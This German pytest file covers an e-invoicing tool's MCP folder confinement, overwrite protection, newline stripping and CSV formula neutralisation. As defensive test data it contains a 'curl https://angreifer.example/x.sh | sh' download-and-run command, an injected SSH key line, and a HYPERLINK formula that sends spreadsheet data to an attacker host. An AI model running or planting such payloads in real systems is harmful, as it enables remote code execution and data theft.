"""MCP-Pfadgrenzen, kein Überschreiben, CSV-Formeln, Zeilenumbrüche und kaputte Dateien."""

import asyncio
import hashlib
import json
from importlib import resources

import pytest

from erechnung import datev, mcp_server, offiziell
from erechnung.cli import main
from erechnung.eingabe import aus_dict
from erechnung.mcp_server import ToolError
from erechnung.rechnen import berechnen


def _eingabe(name: str = "01_standard") -> dict:
    return json.loads(resources.files("erechnung").joinpath("beispiele", f"{name}.json").read_text(encoding="utf-8"))


@pytest.fixture
def ordner(tmp_path, monkeypatch):
    erlaubt = tmp_path / "erlaubt"
    erlaubt.mkdir()
    monkeypatch.setenv("ERECHNUNG_MCP_ORDNER", str(erlaubt))
    return erlaubt


# MCP: nur im Ordner, nichts überschreiben


def test_mcp_schreibt_nicht_ausserhalb_des_ordners(ordner, tmp_path):
    fremd = tmp_path / "authorized_keys"
    with pytest.raises(ToolError, match="außerhalb"):
        mcp_server.erechnung_erstellen(json.dumps(_eingabe()), str(fremd))
    assert not fremd.exists()
    with pytest.raises(ToolError, match="außerhalb"):
        mcp_server.erechnung_erstellen(json.dumps(_eingabe()), "../neu.xml")


def test_mcp_liest_nicht_ausserhalb_des_ordners(ordner, tmp_path):
    fremd = tmp_path / "geheim.xml"
    fremd.write_text("<Invoice/>")
    with pytest.raises(ToolError, match="außerhalb"):
        mcp_server.erechnung_lesen(str(fremd))


def test_mcp_symlink_nach_aussen_zaehlt_als_aussen(ordner, tmp_path):
    ziel = tmp_path / "draussen"
    ziel.mkdir()
    (ordner / "link").symlink_to(ziel)
    with pytest.raises(ToolError, match="außerhalb"):
        mcp_server.erechnung_erstellen(json.dumps(_eingabe()), "link/neu.xml")


def test_mcp_ueberschreibt_nicht(ordner):
    vorhanden = ordner / "rechnung.xml"
    vorhanden.write_text("alt")
    with pytest.raises(ToolError, match="gibt es schon"):
        mcp_server.erechnung_erstellen(json.dumps(_eingabe()), str(vorhanden))
    assert vorhanden.read_text() == "alt"


def test_mcp_nur_bekannte_endungen(ordner):
    with pytest.raises(ToolError, match="nur"):
        mcp_server.erechnung_erstellen(json.dumps(_eingabe()), ".zshrc")
    with pytest.raises(ToolError, match="nur"):
        mcp_server.erechnung_datev([], "autostart.sh")


def test_mcp_erstellt_relativ_zum_ordner(ordner):
    antwort = json.loads(mcp_server.erechnung_erstellen(json.dumps(_eingabe()), "neu.xml", "xrechnung-cii"))
    assert (ordner / "neu.xml").is_file()
    assert antwort["datei"] == str((ordner / "neu.xml").resolve())


def test_mcp_anzeigen_ueberschreibt_vorhandene_ansicht_nicht(ordner):
    mcp_server.erechnung_erstellen(json.dumps(_eingabe()), "r.xml", "xrechnung-ubl")
    (ordner / "r.html").write_text("alt")
    with pytest.raises(ToolError, match="gibt es schon"):
        mcp_server.erechnung_anzeigen("r.xml")
    assert mcp_server.erechnung_anzeigen("r.xml", "r_ansicht.html").endswith("r_ansicht.html")
    assert (ordner / "r.html").read_text() == "alt"


def test_mcp_datev_ueberschreibt_nicht(ordner):
    mcp_server.erechnung_erstellen(json.dumps(_eingabe()), "r.xml", "xrechnung-ubl")
    (ordner / "EXTF.csv").write_text("alt")
    with pytest.raises(ToolError, match="gibt es schon"):
        mcp_server.erechnung_datev(["r.xml"], "EXTF.csv")
    assert json.loads(mcp_server.erechnung_datev(["r.xml"], "EXTF_neu.csv"))["buchungen"] == 1


def test_mcp_lehnt_xrechnung_mit_falscher_rechnungsart_ab(ordner):
    daten = _eingabe()
    daten["art"] = "382"
    with pytest.raises(ToolError, match="BR-DE-17"):
        mcp_server.erechnung_erstellen(json.dumps(daten), "a382.xml")
    assert not (ordner / "a382.xml").exists()


def test_mcp_fehlertext_kommt_beim_client_an(ordner):
    pytest.importorskip("mcp")
    if isinstance(mcp_server.server, mcp_server._OhneMcp):
        pytest.skip("mcp nicht installiert")

    async def aufruf():
        return await mcp_server.server.call_tool("erechnung_lesen", {"datei": "gibt-es-nicht.xml"})

    with pytest.raises(Exception, match="Datei nicht gefunden"):
        asyncio.run(aufruf())


def test_mcp_ohne_extra_meldet_hinweis(monkeypatch, capsys):
    monkeypatch.setattr(mcp_server, "_Server", None)
    with pytest.raises(SystemExit) as ende:
        mcp_server.main()
    assert ende.value.code == 2
    assert "e-rechnung[mcp]" in capsys.readouterr().err


def test_cli_lehnt_xrechnung_mit_falscher_rechnungsart_ab(tmp_path, capsys):
    daten = _eingabe()
    daten["art"] = "382"
    (tmp_path / "a382.json").write_text(json.dumps(daten), encoding="utf-8")
    assert main(["erstellen", str(tmp_path / "a382.json"), "-o", str(tmp_path / "a382.xml")]) == 1
    assert "BR-DE-17" in capsys.readouterr().err
    assert not (tmp_path / "a382.xml").exists()


# Zeilenumbrüche in einzeiligen Feldern


def test_zeilenumbrueche_in_namen_werden_entfernt():
    daten = _eingabe()
    daten["kaeufer"]["name"] = "Beispiel Handel AG\nssh-ed25519 AAAA angreifer@example.com"
    daten["verkaeufer"]["adresse"]["strasse"] = "Musterstraße 1\r\ncurl https://angreifer.example/x.sh | sh"
    daten["positionen"][0]["name"] = "Beratung\u2028zweite Zeile"
    r = aus_dict(daten)
    assert r.kaeufer.name == "Beispiel Handel AG ssh-ed25519 AAAA angreifer@example.com"
    assert "\n" not in r.verkaeufer.adresse.strasse and "\r" not in r.verkaeufer.adresse.strasse
    assert r.positionen[0].name == "Beratung zweite Zeile"


def test_zeilenumbrueche_in_freitext_bleiben():
    daten = _eingabe()
    daten["notizen"] = ["Zeile 1\nZeile 2"]
    daten["positionen"][0]["beschreibung"] = "Teil A\nTeil B"
    r = aus_dict(daten)
    assert r.notizen == ["Zeile 1\nZeile 2"]
    assert r.positionen[0].beschreibung == "Teil A\nTeil B"


# DATEV-CSV: keine Formeln, keine Umbrüche


@pytest.mark.parametrize("name", ['=HYPERLINK("https://angreifer.example/?d="&A1;"Klick")', "+1+1", "-2+3", "@SUMME(A1)"])
def test_datev_entschaerft_formeln(name):
    daten = _eingabe()
    daten["verkaeufer"]["name"] = name
    import csv as csvmodul

    daten_csv, _ = datev.stapel([berechnen(aus_dict(daten))])
    zeilen = list(csvmodul.reader(daten_csv.decode("cp1252").splitlines()[2:], delimiter=";"))
    assert zeilen[0][datev.SPALTEN.index("Buchungstext")].startswith("'")


def test_datev_text_einzeilig():
    assert datev._text("Zeile 1\r\nZeile 2\tEnde", 60) == '"Zeile 1 Zeile 2 Ende"'
    assert datev._text('Firma "Nord"', 60) == '"Firma ""Nord"""'
    assert datev._text("", 60) == ""


def test_datev_csv_hat_feste_zeilenzahl_bei_umbruch_im_namen():
    from erechnung.modell import Partei

    r = berechnen(aus_dict(_eingabe()))
    r.verkaeufer = Partei(name="Nordlicht\nBeispiel GmbH", ust_id=r.verkaeufer.ust_id)
    csv, _ = datev.stapel([r])
    assert csv.count(b"\r\n") == 3 and csv.count(b"\n") == 3


# Beschädigte und leere Dateien


@pytest.fixture
def kaputt(tmp_path):
    p = tmp_path / "kaputt.pdf"
    p.write_bytes(b"%PDF-1.4\ngarbage")
    return p


def test_kaputtes_pdf_lesen_ohne_traceback(kaputt, capsys):
    assert main(["lesen", str(kaputt)]) == 1
    fehler = capsys.readouterr().err
    assert "PDF nicht lesbar" in fehler and "Traceback" not in fehler


def test_kaputtes_pdf_validieren_exit_2_und_weiter(kaputt, tmp_path, capsys):
    main(["beispiele", str(tmp_path / "bsp")])
    gut = tmp_path / "bsp" / "01_standard_xrechnung_ubl.xml"
    code = main(["validieren", "--ohne-offiziell", str(kaputt), str(gut)])
    aus = capsys.readouterr().out
    assert "PDF nicht lesbar" in aus
    assert str(gut) in aus
    assert code == 1  # ohne offizielle Prüfung zählt die Vorprüfung


def test_kaputtes_pdf_validieren_offiziell_exit_2(kaputt, capsys):
    assert main(["validieren", "--offline", str(kaputt)]) == 2
    assert "PDF nicht lesbar" in capsys.readouterr().out


def test_kaputtes_pdf_datev_ueberspringt(kaputt, tmp_path, capsys):
    main(["beispiele", str(tmp_path / "bsp")])
    gut = tmp_path / "bsp" / "01_standard_xrechnung_ubl.xml"
    ziel = tmp_path / "EXTF.csv"
    assert main(["datev", str(kaputt), str(gut), "-o", str(ziel)]) == 0
    assert "übersprungen" in capsys.readouterr().err
    assert ziel.is_file()


def test_kaputte_vorlage_beim_erstellen(kaputt, tmp_path, capsys):
    (tmp_path / "r.json").write_text(json.dumps(_eingabe()), encoding="utf-8")
    assert main(["erstellen", str(tmp_path / "r.json"), "--format", "zugferd", "--pdf", str(kaputt),
                 "-o", str(tmp_path / "r.pdf")]) == 1
    assert "Vorlage-PDF nicht lesbar" in capsys.readouterr().err


def test_leere_datei(tmp_path, capsys):
    leer = tmp_path / "leer.pdf"
    leer.write_bytes(b"")
    assert main(["lesen", str(leer)]) == 1
    assert "leer" in capsys.readouterr().err


def test_zugferd_mit_ubl_erklaert_den_fehler(tmp_path, capsys):
    from erechnung.pdf_layout import pdf as lesefassung
    import shutil

    if shutil.which("gs") is None:
        pytest.skip("Ghostscript nicht installiert")
    main(["beispiele", str(tmp_path / "bsp")])
    ubl_datei = tmp_path / "bsp" / "01_standard_xrechnung_ubl.xml"
    vorlage = tmp_path / "v.pdf"
    vorlage.write_bytes(lesefassung(aus_dict(_eingabe())))
    assert main(["zugferd", str(ubl_datei), "--pdf", str(vorlage)]) == 1
    assert "ZUGFeRD braucht CII-XML" in capsys.readouterr().err


# Lokale KoSIT-ZIP


def test_lokale_zip_mit_falscher_pruefsumme(tmp_path, monkeypatch):
    zip_datei = tmp_path / f"{offiziell.KONFIG_VERSION}.zip"
    zip_datei.write_bytes(b"PK\x05\x06" + b"\0" * 18)
    monkeypatch.setenv("ERECHNUNG_KOSIT_KONFIG", str(zip_datei))
    monkeypatch.setenv("ERECHNUNG_CACHE", str(tmp_path / "cache"))
    assert hashlib.sha256(zip_datei.read_bytes()).hexdigest() != offiziell.KONFIG_SHA256
    with pytest.raises(offiziell.NichtVerfuegbar, match="Prüfsumme"):
        offiziell.konfiguration()
    monkeypatch.setenv("ERECHNUNG_KOSIT_KONFIG_OHNE_HASH", "1")
    assert offiziell.konfiguration().is_dir()
